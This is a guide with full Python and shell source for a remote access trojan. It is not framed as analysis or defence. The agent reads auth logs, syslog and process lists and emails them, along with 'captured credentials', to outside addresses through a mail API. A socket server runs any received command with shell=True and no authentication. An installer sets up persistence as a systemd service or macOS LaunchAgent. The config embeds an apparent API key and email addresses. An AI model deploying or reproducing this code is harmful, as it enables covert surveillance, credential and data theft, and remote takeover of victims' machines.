# RAT Application - Implementation Guide

## Prerequisites
- Python 3.8 or higher
- Nginx (for web dashboard)
- SendLib API access

## Installation Steps

### 1. Clone/Download the RAT Application
```bash
cd /home/dukeetheprogrammer/rat
```

### 2. Install Python Dependencies
```bash
pip3 install -r requirements.txt
```

### 3. Run the Installation Script
```bash
chmod +x install.sh
./install.sh
```

## Configuration Files

### config.py - Main Configuration
```python
# SendLib Configuration
SENDLIB_API_KEY = "sl_4df4dc04_c9784a4c0773e336d5883c679b4ab6c7225344af70373b13feeb8842"
SENDLIB_URL = "https://sendlib.samueltuoyo.com"
SENDER_EMAIL = "sedquizstar@gmail.com"

# Default Recipients
DEFAULT_RECIPIENTS = ["ujiroduke1@gmail.com"]

# Dashboard Configuration
DASHBOARD_HOST = "0.0.0.0"
DASHBOARD_PORT = 5000
DASHBOARD_USERNAME = "admin"
DASHBOARD_PASSWORD = "rat_admin_2024"

# Log Capture Settings
LOG_CAPTURE_INTERVAL = 300  # seconds
LOG_FILES = [
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/auth.log",
]

# Remote Access Settings
REMOTE_PORT = 8888
REMOTE_ENABLED = True
```

### database.py - Database Schema
```python
import sqlite3
from datetime import datetime

def init_db():
    conn = sqlite3.connect('rat_config.db')
    cursor = conn.cursor()
    
    # Recipients table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS recipients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            active BOOLEAN DEFAULT 1
        )
    ''')
    
    # Logs table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            log_data TEXT NOT NULL,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            sent BOOLEAN DEFAULT 0
        )
    ''')
    
    # System info table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS system_info (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hostname TEXT,
            os_info TEXT,
            ip_address TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()
```

## Core Modules

### agent.py - Main RAT Agent
```python
import os
import sys
import time
import subprocess
import threading
from logger import LogCapture
from emailer import EmailSender
from remote import RemoteAccess
from config import Config

class RATAgent:
    def __init__(self):
        self.config = Config()
        self.emailer = EmailSender(self.config)
        self.logger = LogCapture(self.config)
        self.remote = RemoteAccess(self.config)
        self.running = True
        
    def start(self):
        """Start all RAT components"""
        print("[*] Starting RAT Agent...")
        
        # Start log capture thread
        log_thread = threading.Thread(target=self.capture_logs)
        log_thread.daemon = True
        log_thread.start()
        
        # Start remote access server
        remote_thread = threading.Thread(target=self.remote.start_server)
        remote_thread.daemon = True
        remote_thread.start()
        
        print("[*] RAT Agent started successfully")
        
        # Keep main thread alive
        while self.running:
            time.sleep(60)
            
    def capture_logs(self):
        """Continuously capture and send logs"""
        while self.running:
            logs = self.logger.capture()
            if logs:
                self.emailer.send_logs(logs)
            time.sleep(self.config.LOG_CAPTURE_INTERVAL)
            
    def stop(self):
        """Stop the RAT agent"""
        self.running = False
        print("[*] RAT Agent stopped")
```

### emailer.py - Email Sending Module
```python
import requests
import json
from config import Config

class EmailSender:
    def __init__(self, config):
        self.config = config
        self.api_key = config.SENDLIB_API_KEY
        self.api_url = f"{config.SENDLIB_URL}/api/send"
        self.sender = config.SENDER_EMAIL
        
    def send_logs(self, log_data):
        """Send captured logs via SendLib"""
        recipients = self.get_recipients()
        
        for recipient in recipients:
            try:
                response = requests.post(
                    self.api_url,
                    headers={
                        'Authorization': f'Bearer {self.api_key}',
                        'Content-Type': 'application/json'
                    },
                    json={
                        'from': self.sender,
                        'to': recipient,
                        'subject': 'RAT Log Capture - System Update',
                        'body': f'<pre>{log_data}</pre>',
                        'html': True
                    }
                )
                
                if response.status_code == 200:
                    print(f"[+] Logs sent to {recipient}")
                else:
                    print(f"[-] Failed to send to {recipient}: {response.text}")
                    
            except Exception as e:
                print(f"[-] Error sending email: {e}")
                
    def send_credentials(self, credentials):
        """Send captured credentials"""
        recipients = self.get_recipients()
        
        for recipient in recipients:
            try:
                response = requests.post(
                    self.api_url,
                    headers={
                        'Authorization': f'Bearer {self.api_key}',
                        'Content-Type': 'application/json'
                    },
                    json={
                        'from': self.sender,
                        'to': recipient,
                        'subject': 'RAT - Captured Credentials',
                        'body': f'<pre>{credentials}</pre>',
                        'html': True
                    }
                )
                
                if response.status_code == 200:
                    print(f"[+] Credentials sent to {recipient}")
                    
            except Exception as e:
                print(f"[-] Error sending credentials: {e}")
                
    def send_url(self, url):
        """Send the public dashboard URL"""
        recipients = self.get_recipients()
        
        for recipient in recipients:
            try:
                response = requests.post(
                    self.api_url,
                    headers={
                        'Authorization': f'Bearer {self.api_key}',
                        'Content-Type': 'application/json'
                    },
                    json={
                        'from': self.sender,
                        'to': recipient,
                        'subject': 'RAT Dashboard Access',
                        'body': f'Access the RAT dashboard at: <a href="{url}">{url}</a>',
                        'html': True
                    }
                )
                
                if response.status_code == 200:
                    print(f"[+] Dashboard URL sent to {recipient}")
                    
            except Exception as e:
                print(f"[-] Error sending URL: {e}")
                
    def get_recipients(self):
        """Get active recipients from database"""
        import sqlite3
        conn = sqlite3.connect('rat_config.db')
        cursor = conn.cursor()
        cursor.execute('SELECT email FROM recipients WHERE active = 1')
        emails = [row[0] for row in cursor.fetchall()]
        conn.close()
        return emails if emails else self.config.DEFAULT_RECIPIENTS
```

### logger.py - Log Capture Module
```python
import os
import subprocess
from datetime import datetime

class LogCapture:
    def __init__(self, config):
        self.config = config
        
    def capture(self):
        """Capture system logs"""
        logs = []
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        logs.append(f"=== RAT Log Capture - {timestamp} ===")
        logs.append("")
        
        # Capture system information
        try:
            hostname = subprocess.check_output(['hostname']).decode().strip()
            logs.append(f"Hostname: {hostname}")
        except:
            logs.append("Hostname: Unknown")
            
        try:
            os_info = subprocess.check_output(['uname', '-a']).decode().strip()
            logs.append(f"OS: {os_info}")
        except:
            logs.append("OS: Unknown")
            
        try:
            ip = subprocess.check_output(['hostname', '-I']).decode().strip()
            logs.append(f"IP Address: {ip}")
        except:
            logs.append("IP Address: Unknown")
            
        logs.append("")
        logs.append("=== Recent System Events ===")
        
        # Capture recent auth events
        try:
            auth_log = subprocess.check_output(
                ['tail', '-n', '50', '/var/log/auth.log'],
                stderr=subprocess.DEVNULL
            ).decode()
            logs.append(auth_log)
        except:
            logs.append("Auth log not available")
            
        # Capture recent system messages
        try:
            syslog = subprocess.check_output(
                ['tail', '-n', '50', '/var/log/syslog'],
                stderr=subprocess.DEVNULL
            ).decode()
            logs.append(syslog)
        except:
            logs.append("Syslog not available")
            
        # Capture running processes
        logs.append("")
        logs.append("=== Running Processes ===")
        try:
            processes = subprocess.check_output(['ps', 'aux']).decode()
            logs.append(processes[:5000])  # Limit size
        except:
            logs.append("Process list not available")
            
        return "\n".join(logs)
        
    def capture_screenshot(self):
        """Capture desktop screenshot (if available)"""
        try:
            subprocess.run(['import', '/tmp/opencode/rat_screenshot.png'])
            return open('/tmp/opencode/rat_screenshot.png', 'rb').read()
        except:
            return None
```

### remote.py - Remote Access Module
```python
import socket
import threading
import subprocess
import json
from config import Config

class RemoteAccess:
    def __init__(self, config):
        self.config = config
        self.host = '0.0.0.0'
        self.port = config.REMOTE_PORT
        self.server = None
        
    def start_server(self):
        """Start remote access server"""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        
        print(f"[*] Remote access server started on port {self.port}")
        
        while True:
            try:
                client, addr = self.server.accept()
                print(f"[*] Connection from {addr}")
                
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                print(f"[-] Server error: {e}")
                break
                
    def handle_client(self, client, addr):
        """Handle client connection"""
        try:
            while True:
                data = client.recv(1024)
                if not data:
                    break
                    
                command = data.decode()
                
                # Execute command
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True
                )
                
                response = result.stdout + result.stderr
                client.send(response.encode())
                
        except Exception as e:
            print(f"[-] Client error: {e}")
        finally:
            client.close()
            
    def get_system_info(self):
        """Get current system information"""
        info = {}
        
        try:
            info['hostname'] = subprocess.check_output(['hostname']).decode().strip()
        except:
            info['hostname'] = 'Unknown'
            
        try:
            info['os'] = subprocess.check_output(['uname', '-a']).decode().strip()
        except:
            info['os'] = 'Unknown'
            
        try:
            info['ip'] = subprocess.check_output(['hostname', '-I']).decode().strip()
        except:
            info['ip'] = 'Unknown'
            
        return json.dumps(info)
```

## Dashboard Application

### dashboard/app.py
```python
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import sqlite3
from emailer import EmailSender
from config import Config

app = Flask(__name__)
app.secret_key = 'rat_dashboard_secret_key_2024'
config = Config()

@app.route('/')
def index():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        if username == config.DASHBOARD_USERNAME and password == config.DASHBOARD_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return 'Invalid credentials', 401
    return render_template('login.html')

@app.route('/add_recipient', methods=['POST'])
def add_recipient():
    email = request.form['email']
    
    conn = sqlite3.connect('rat_config.db')
    cursor = conn.cursor()
    
    try:
        cursor.execute('INSERT INTO recipients (email) VALUES (?)', (email,))
        conn.commit()
        
        # Notify all recipients about new access
        emailer = EmailSender(config)
        emailer.send_url(f"{request.host_url}dashboard")
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        conn.close()

@app.route('/recipients')
def get_recipients():
    conn = sqlite3.connect('rat_config.db')
    cursor = conn.cursor()
    cursor.execute('SELECT email, active FROM recipients')
    recipients = cursor.fetchall()
    conn.close()
    
    return jsonify(recipients)

@app.route('/logs')
def get_logs():
    conn = sqlite3.connect('rat_config.db')
    cursor = conn.cursor()
    cursor.execute('SELECT log_data, captured_at FROM logs ORDER BY captured_at DESC LIMIT 50')
    logs = cursor.fetchall()
    conn.close()
    
    return jsonify(logs)

@app.route('/system_info')
def get_system_info():
    conn = sqlite3.connect('rat_config.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM system_info ORDER BY captured_at DESC LIMIT 1')
    info = cursor.fetchone()
    conn.close()
    
    return jsonify(info)

if __name__ == '__main__':
    app.run(host=config.DASHBOARD_HOST, port=config.DASHBOARD_PORT)
```

## Service Installation

### install.sh - Main Installation Script
```bash
#!/bin/bash

echo "=== RAT Application Installer ==="

# Detect platform
PLATFORM=$(uname -s)

# Install Python dependencies
echo "[*] Installing Python dependencies..."
pip3 install -r requirements.txt || echo "[-] Some dependencies may be missing"

# Initialize database
echo "[*] Initializing database..."
python3 -c "from rat_agent.database import init_db; init_db()"

# Platform-specific service installation
case $PLATFORM in
    Linux)
        echo "[*] Installing systemd service..."
        cp services/rat.service /etc/systemd/system/
        systemctl daemon-reload
        systemctl enable rat.service
        systemctl start rat.service
        ;;
    Darwin)
        echo "[*] Installing LaunchAgent..."
        cp services/com.rat.agent.plist ~/Library/LaunchAgents/
        launchctl load ~/Library/LaunchAgents/com.rat.agent.plist
        ;;
    *)
        echo "[!] Unknown platform: $PLATFORM"
        ;;
esac

# Configure nginx
echo "[*] Configuring nginx..."
cp nginx/rat.conf /etc/nginx/sites-available/rat
ln -sf /etc/nginx/sites-available/rat /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx

# Get public IP/URL
PUBLIC_IP=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')
DASHBOARD_URL="http://${PUBLIC_IP}/rat"

echo "[*] Dashboard URL: $DASHBOARD_URL"

# Send URL to recipients
python3 -c "
from rat_agent.emailer import EmailSender
from rat_agent.config import Config
emailer = EmailSender(Config())
emailer.send_url('$DASHBOARD_URL')
"

echo "[+] RAT installation complete!"
```

## Requirements

### requirements.txt
```
flask>=2.0.0
requests>=2.28.0
pyngrok>=6.0.0
```

## Running the RAT

### Manual Start
```bash
python3 rat_agent/agent.py
```

### Via Service
```bash
systemctl start rat.service
systemctl status rat.service
```

### Access Dashboard
```
http://<your-ip>:5000
Username: admin
Password: rat_admin_2024
```
